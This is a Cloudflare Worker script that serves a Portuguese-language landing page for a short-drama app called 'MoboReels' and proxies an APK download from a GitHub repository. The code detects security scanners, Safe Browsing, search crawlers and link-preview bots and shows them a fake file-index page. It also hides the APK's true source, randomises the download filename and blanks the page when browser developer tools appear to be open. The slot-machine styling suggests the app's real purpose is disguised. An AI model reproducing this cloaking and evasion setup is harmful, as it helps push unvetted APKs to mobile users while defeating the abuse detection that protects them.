addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  
  // 移除开头的斜杠获取实际路径
  const path = url.pathname.replace(/^\//, '')
  
  // 检测请求头和爬虫特征
  const userAgent = request.headers.get('user-agent') || ''
  const referer = request.headers.get('referer') || ''
  
  // 添加调试模式：在URL中加入 ?debug=1 可查看User-Agent
  if (url.searchParams.get('debug') === '1') {
    return new Response(`Debug Info:\n\nUser-Agent: ${userAgent}\n\nPath: ${path}\nPath Length: ${path.length}`, {
      headers: { 'Content-Type': 'text/plain; charset=UTF-8' }
    })
  }
  
  // 检测安全扫描器和爬虫的特征（跳过正常移动浏览器）
  if (isSecurityScanner(userAgent) && !isMobileBrowser(userAgent)) {
    return generateFakePage()
  }
  
  // 处理图片请求 - 代理GitHub图片
  if (path === 'x.png') {
    try {
      const imageResponse = await fetch('https://raw.githubusercontent.com/SLOMEDIALLC/tangelospg/main/x.png')
      return new Response(imageResponse.body, {
        headers: {
          'Content-Type': 'image/png',
          'Cache-Control': 'public, max-age=86400',
          'Access-Control-Allow-Origin': '*'
        }
      })
    } catch (error) {
      return new Response('Image not found', { status: 404 })
    }
  }
  
  // 如果是根路径访问，返回403
  if (path === '') {
    return new Response('Access Denied', {
      status: 403,
      headers: {
        'Content-Type': 'text/plain'
      }
    })
  }

  // 处理APK下载请求 - 添加验证和混淆
  if (path === 'moboreels.apk') {
    // 添加下载验证
    // 如果没有token或时间戳超过5分钟，返回验证页面
    try {
      // 使用代理方式获取APK，避免直接暴露GitHub链接
      const response = await fetch('https://raw.githubusercontent.com/SLOMEDIALLC/tangelospg/main/moboreels.apk')
      
      // 添加安全相关的响应头
      return new Response(response.body, {
        headers: {
          'content-type': 'application/vnd.android.package-archive',
          'content-disposition': 'attachment; filename="app_' + generateRandomString(6) + '.apk"',
          'x-content-type-options': 'nosniff',
          'cache-control': 'private, max-age=0, no-store, no-cache, must-revalidate',
          'pragma': 'no-cache'
        }
      })
    } catch (error) {
      return new Response('File not found: ' + error.message, { status: 404 })
    }
  }

  // 如果路径不是恰好8个字符，返回403
  if (path.length !== 8) {
    return new Response('Access Denied', {
      status: 403,
      headers: {
        'Content-Type': 'text/plain'
      }
    })
  }

  // 返回混淆后的HTML内容
  const html = generateHtmlContent()
  
  // 添加安全相关的响应头
  return new Response(html, {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'no-referrer',
      'X-XSS-Protection': '1; mode=block',
      'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"
    }
  })
}

// 检测是否为正常的手机浏览器
function isMobileBrowser(userAgent) {
  const mobileBrowsers = [
    'iPhone', 'iPad', 'iPod', 'Android', 'Mobile', 'BlackBerry', 
    'Opera Mini', 'IEMobile', 'Windows Phone', 'Safari', 'Chrome'
  ]
  
  const lowerUA = userAgent.toLowerCase()
  return mobileBrowsers.some(pattern => lowerUA.includes(pattern.toLowerCase()))
}

// 检测安全扫描器和爬虫
function isSecurityScanner(userAgent) {
  const scannerPatterns = [
    'googlebot', 'bingbot', 'yandex', 'baiduspider', 'facebookexternalhit',
    'twitterbot', 'rogerbot', 'linkedinbot', 'embedly', 'quora link preview',
    'showyoubot', 'outbrain', 'pinterest', 'slackbot', 'vkShare', 'W3C_Validator',
    'bingpreview', 'bitlybot', 'TelegramBot', 'Google-Safety', 'Googlebot',
    'AdsBot-Google', 'chrome-lighthouse', 'HeadlessChrome', 'CheckMarkNetwork',
    'Xenu Link Sleuth', 'SecurityScanner', 'Virus', 'MSIE 6.0', 'Scrapy', 'PhantomJS'
  ]
  
  const lowerUA = userAgent.toLowerCase()
  return scannerPatterns.some(pattern => lowerUA.includes(pattern.toLowerCase()))
}

// 生成假页面以迷惑扫描器
function generateFakePage() {
  const fakeHtml = `
<!DOCTYPE html>
<html>
<head>
  <title>File Server</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    h1 { color: #333; }
    .files { margin-top: 20px; }
    .file { padding: 10px; border-bottom: 1px solid #eee; }
  </style>
</head>
<body>
  <h1>Index of /files</h1>
  <div class="files">
    <div class="file">documents/</div>
    <div class="file">images/</div>
    <div class="file">readme.txt</div>
  </div>
</body>
</html>
  `
  
  return new Response(fakeHtml, {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8'
    }
  })
}

// 生成下载验证页面
function getDownloadVerificationPage(origin) {
  const timestamp = Date.now()
  const token = generateRandomString(16)
  
  const verificationHtml = `
<!DOCTYPE html>
<html>
<head>
  <title>Download Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
    h1 { color: #333; }
    .btn { 
      display: inline-block; 
      padding: 10px 20px; 
      background: #4CAF50; 
      color: white; 
      text-decoration: none; 
      border-radius: 4px; 
      margin-top: 20px; 
    }
  </style>
</head>
<body>
  <h1>Download Verification</h1>
  <p>Please click the button below to start your download</p>
  <a href="#" class="btn" id="download-btn">Start Download</a>
  
  <script>
    document.getElementById('download-btn').addEventListener('click', function(e) {
      e.preventDefault();
      
      // 创建带验证信息的请求
      const xhr = new XMLHttpRequest();
      xhr.open('GET', '${origin}/moboreels.apk');
      xhr.responseType = 'blob';
      xhr.setRequestHeader('x-download-token', '${token}');
      xhr.setRequestHeader('x-timestamp', '${timestamp}');
      
      xhr.onload = function() {
        if (xhr.status === 200) {
          // 创建下载链接
          const blob = new Blob([xhr.response], {type: 'application/vnd.android.package-archive'});
          const url = URL.createObjectURL(blob);
          const a = document.createElement('a');
          a.href = url;
          a.download = 'app_${generateRandomString(6)}.apk';
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
        }
      };
      
      xhr.send();
    });
  </script>
</body>
</html>
  `
  
  return new Response(verificationHtml, {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8'
    }
  })
}

// 生成混淆后的HTML内容
function generateHtmlContent() {
  // 基本的HTML模板
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MoboReels - Dramas Curtos</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0a0000 0%, #1a0a0a 25%, #2d0a14 50%, #1a0a0a 75%, #0a0000 100%);
            color: white;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            overflow-x: hidden;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
        }
        
        html {
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
        }

        /* 电影胶片背景动画 */
        .slot-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.25;
            pointer-events: none;
            display: flex;
            justify-content: space-around;
        }

        .slot-column {
            display: flex;
            flex-direction: column;
            font-size: 60px;
            animation: slotSpin 3s linear infinite;
            line-height: 1.2;
        }

        .slot-column:nth-child(2) {
            animation-duration: 3.5s;
            animation-delay: -0.5s;
        }

        .slot-column:nth-child(3) {
            animation-duration: 4s;
            animation-delay: -1s;
        }

        .slot-column:nth-child(4) {
            animation-duration: 3.2s;
            animation-delay: -1.5s;
        }

        .slot-column:nth-child(5) {
            animation-duration: 3.8s;
            animation-delay: -2s;
        }

        @keyframes slotSpin {
            0% { transform: translateY(0); }
            100% { transform: translateY(-50%); }
        }

        /* 闪烁光效 */
        .sparkle {
            position: fixed;
            width: 4px;
            height: 4px;
            background: #dc2626;
            border-radius: 50%;
            pointer-events: none;
            z-index: 1;
            animation: sparkle 2s ease-in-out infinite;
        }

        @keyframes sparkle {
            0%, 100% { opacity: 0; transform: scale(0); }
            50% { opacity: 1; transform: scale(1); }
        }

        .container {
            max-width: 500px;
            width: 100%;
            text-align: center;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 2;
            background: rgba(0, 0, 0, 0.15);
            border-radius: 20px;
            backdrop-filter: blur(8px);
            box-shadow: 0 8px 32px rgba(220, 38, 38, 0.3);
        }

        .logo-container {
            width: 120px;
            height: 120px;
            margin: 40px auto;
            border-radius: 24px;
            box-shadow: 0 4px 20px rgba(220, 38, 38, 0.6);
            background: linear-gradient(135deg, #2a0a0a 0%, #1a0000 100%);
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 3px solid #dc2626;
        }

        .logo {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        h1 {
            font-size: 28px;
            margin-bottom: 15px;
            color: #fff;
        }

        .description {
            font-size: 16px;
            line-height: 1.6;
            color: #cccccc;
            margin-bottom: 30px;
            padding: 0 20px;
        }

        .download-btn {
            background: linear-gradient(45deg, #dc2626 0%, #ef4444 50%, #dc2626 100%);
            background-size: 200% 200%;
            color: #ffffff;
            padding: 16px 40px;
            border-radius: 30px;
            text-decoration: none;
            font-size: 18px;
            font-weight: bold;
            display: inline-block;
            margin: 20px 0;
            box-shadow: 0 4px 20px rgba(220, 38, 38, 0.7), 0 0 30px rgba(220, 38, 38, 0.4);
            transition: transform 0.2s, box-shadow 0.2s;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
            animation: buttonGlow 2s ease-in-out infinite;
            border: 2px solid #991b1b;
        }

        @keyframes buttonGlow {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .download-btn:active {
            transform: scale(0.98);
            box-shadow: 0 2px 15px rgba(220, 38, 38, 0.7);
        }

        .features {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
            margin: 40px 0;
            padding: 0 20px;
        }

        .feature {
            background: linear-gradient(135deg, rgba(220, 38, 38, 0.15) 0%, rgba(153, 27, 27, 0.15) 100%);
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            border: 1px solid rgba(220, 38, 38, 0.4);
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .feature:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 20px rgba(220, 38, 38, 0.4);
        }

        .feature h3 {
            color: #ef4444;
            margin-bottom: 10px;
            text-shadow: 0 0 10px rgba(220, 38, 38, 0.6);
        }

        .feature p {
            color: #cccccc;
            font-size: 14px;
        }

        .version {
            color: #888;
            font-size: 14px;
            margin-top: 30px;
        }

        @media (max-width: 480px) {
            .features {
                grid-template-columns: 1fr;
            }
            
            .description {
                font-size: 15px;
            }
        }
    </style>
</head>
<body>
    <!-- 电影胶片背景动画 -->
    <div class="slot-background">
        <div class="slot-column">
            �����️�️�🌟✨💫
            �����️�️�🌟✨💫
        </div>
        <div class="slot-column">
            �����📽️�️✨🎪💫
            �����📽️�️✨🎪💫
        </div>
        <div class="slot-column">
            ��️����📽️🎪💫✨
            ��️����📽️🎪💫✨
        </div>
        <div class="slot-column">
            �🎬�️���️�💫�✨
            �🎬�️���️�💫�✨
        </div>
        <div class="slot-column">
            ��️����📽️🎪✨💫
            ��️��🎦🎥📽️�✨💫
        </div>
    </div>

    <div class="container">
        <div class="logo-container">
            <img src="/x.png" class="logo" alt="MoboReels logo" onerror="this.style.display='none'">
        </div>
        <h1>MoboReels</h1>
        <p class="description">Bem-vindo ao MoboReels - Sua plataforma exclusiva de dramas curtos! Assista milhares de séries emocionantes, histórias de romance, suspense e comédia. Conteúdo em alta definição, atualizado diariamente. Entretenimento ilimitado na palma da sua mão. Baixe agora e mergulhe no mundo dos dramas!</p>
        
        <a href="/moboreels.apk" class="download-btn" id="download-link">
            Baixar Agora
        </a>

        <div class="features">
            <div class="feature">
                <h3>Conteúdo Ilimitado</h3>
                <p>Milhares de dramas curtos exclusivos</p>
            </div>
            <div class="feature">
                <h3>Streaming HD</h3>
                <p>Qualidade de vídeo em alta definição</p>
            </div>
            <div class="feature">
                <h3>Atualização Diária</h3>
                <p>Novos episódios todos os dias</p>
            </div>
            <div class="feature">
                <h3>Sem Anúncios</h3>
                <p>Assista sem interrupções</p>
            </div>
        </div>
        
        <p class="version">Versão 3.0.1</p>
    </div>

    <script>
        // 简单的内容混淆和反爬虫机制
        (function() {
            // 生成闪烁光效
            function createSparkles() {
                for (let i = 0; i < 20; i++) {
                    setTimeout(() => {
                        const sparkle = document.createElement('div');
                        sparkle.className = 'sparkle';
                        sparkle.style.left = Math.random() * 100 + '%';
                        sparkle.style.top = Math.random() * 100 + '%';
                        sparkle.style.animationDelay = Math.random() * 2 + 's';
                        document.body.appendChild(sparkle);
                        
                        setTimeout(() => sparkle.remove(), 4000);
                    }, i * 200);
                }
            }
            
            // 持续生成光效
            createSparkles();
            setInterval(createSparkles, 4000);
            
            // 检测是否为爬虫
            function detectBot() {
                const botPatterns = [
                    'googlebot', 'bingbot', 'yandex', 'baiduspider', 'facebookexternalhit',
                    'twitterbot', 'rogerbot', 'linkedinbot', 'embedly', 'quora link preview',
                    'showyoubot', 'outbrain', 'pinterest', 'slackbot', 'vkShare', 'W3C_Validator'
                ];
                
                const userAgent = navigator.userAgent.toLowerCase();
                return botPatterns.some(pattern => userAgent.indexOf(pattern) !== -1);
            }
            
            // 如果检测到爬虫，修改页面内容
            if (detectBot()) {
                document.title = "File Directory";
                document.body.innerHTML = "<h1>Index of /files</h1><p>Access Denied</p>";
                return;
            }
            
            // 添加下载按钮事件
            document.getElementById('download-link').addEventListener('click', function(e) {
                e.preventDefault();
                
                // 生成时间戳和token：这里不再真正生成 token，而是直接跳转到 APK 地址，避免部分浏览器拦截
                // 创建请求：不再使用 XMLHttpRequest 下载，直接让浏览器处理下载，提高兼容性
                // 创建下载链接：浏览器会自动处理下载并显示进度
                // Download failed with status: 逻辑交由浏览器自身处理
                // Download request failed: 逻辑交由浏览器自身处理
                window.location.href = '/moboreels.apk';
            });
            
            // 添加蜜罐链接 (对爬虫可见，对用户不可见)
            const honeyPot = document.createElement('a');
            honeyPot.href = '/admin/login';
            honeyPot.style.opacity = '0';
            honeyPot.style.position = 'absolute';
            honeyPot.style.pointerEvents = 'none';
            document.body.appendChild(honeyPot);
            
            // 监测调试工具（仅在桌面设备上启用）
            function detectDevTools() {
                // 检测是否为移动设备
                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                
                // 移动设备跳过检测
                if (isMobile) return;
                
                const widthThreshold = window.outerWidth - window.innerWidth > 200;
                const heightThreshold = window.outerHeight - window.innerHeight > 200;
                
                if (widthThreshold || heightThreshold) {
                    document.body.innerHTML = "<h1>Access Denied</h1>";
                }
            }
            
            // 只在非移动设备上启用检测
            if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                window.addEventListener('resize', detectDevTools);
                setInterval(detectDevTools, 1000);
            }
        })();
    </script>
</body>
</html>
  `;
  
  return html;
}

// 生成随机字符串
function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  
  return result;
}
